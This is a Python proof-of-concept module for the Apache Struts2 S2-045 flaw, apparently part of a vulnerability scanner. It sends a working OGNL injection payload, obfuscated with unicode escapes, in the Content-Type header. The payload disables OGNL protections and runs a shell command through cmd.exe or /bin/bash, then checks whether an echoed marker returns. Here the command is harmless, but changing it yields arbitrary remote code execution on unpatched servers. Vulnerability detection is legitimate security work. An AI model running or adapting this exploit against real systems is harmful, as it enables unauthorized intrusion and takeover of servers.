'''
Function:
    s2-045
Author:
    花果山
Wechat official account：
    中龙 红客突击队
Official website：
    https://www.hscsec.cn/
Email：
    spmonkey@hscsec.cn
Blog:
    https://spmonkey.github.io/
GitHub:
    https://github.com/spmonkey/
'''
# -*- coding: utf-8 -*-
import random
import string
import requests
from urllib.parse import urlparse
from requests.packages.urllib3 import disable_warnings
disable_warnings()


class poc:
    def __init__(self, url, proxies):
        self.url = url
        self.headers = {
            'User-Agent': 'Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)',
        }
        self.value_list = []
        self.result_text = ""
        self.proxies = proxies

    def vuln(self):
        url = self.url
        char = ''.join(random.sample(string.ascii_letters + string.digits, 8))
        payload = "test" + char
        self.headers["Content-Type"] = "smultipart/form-data%{(#dm=@\\u006fgnl.OgnlC\\u006fntext@DEF\\u0041ULT_MEMBER_\\u0041CCESS).(#_member\\u0041ccess?(#_member\\u0041ccess=#dm):((#c\\u006fntainer=#c\\u006fntext['c\\u006fm.\\u006fpensymph\\u006fny.xw\\u006frk2.\\u0041cti\\u006fnC\\u006fntext.c\\u006fntainer']).(#\\u006fgnlUtil=#c\\u006fntainer.getInstance(@c\\u006fm.\\u006fpensymph\\u006fny.xw\\u006frk2.\\u006fgnl.OgnlUtil@class)).(#\\u006fgnlUtil.getExcludedPackageNames().clear()).(#\\u006fgnlUtil.getExcludedClasses().clear()).(#c\\u006fntext.setMember\\u0041ccess(#dm)))).(#req=#c\\u006fntext.get('c\\u006fm.\\u006fpensymph\\u006fny.xw\\u006frk2.dispatcher.HttpServletRequest')).(#hh=#c\\u006fntext.get('c\\u006fm.\\u006fpensymph\\u006fny.xw\\u006frk2.dispatcher.HttpServletResp\\u006fnse')).(#\\u006fsname=@java.lang.System@getPr\\u006fperty('\\u006fs.name')).(#list=#\\u006fsname.startsWith('Wind\\u006fws')?{'cmd.exe','/c','echo " + payload + "'}:{'/bin/bash','-c','echo " + payload + "'}).(#aa=(new java.lang.Pr\\u006fcessBuilder(#list)).start()).(#bb=#aa.getInputStream()).(#hh.getWriter().println(new java.lang.String(new \\u006frg.apache.c\\u006fmm\u006fns.i\\u006f.IOUtils().t\u006fByte\\u0041rray(#bb),'GB2312'))?true:true).(#hh.getWriter().flush()).(#hh.getWriter().cl\\u006fse())}; boundary=---------------------------18012721719170"
        data = ""
        data += "-----------------------------18012721719170\n"
        data += 'Content-Disposition: form-data; name="pocfile"; filename="text.txt"\n'
        data += "Content-Type: text/plain\n\n"
        data += char + "\n"
        data += "-----------------------------18012721719170"
        try:
            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
            if payload in result.text:
                target = urlparse(url)
                self.result_text += """\n        [+]    \033[32m检测到目标站点存在任意命令执行漏洞 (s2-045)\033[0m
                 POST {} HTTP/1.1
                 Host: {}""".format(target.path, target.netloc)
                for request_type, request_text in dict(result.request.headers).items():
                    self.result_text += "\n                 {}: {}".format(request_type, request_text)
                self.result_text += "\n"
                for i in data.split("\n"):
                    self.result_text += "\n                 {}".format(i)
                return True
            else:
                return False
        except:
            return False

    def main(self):
        if self.vuln():
             return self.result_text
        else:
            return False

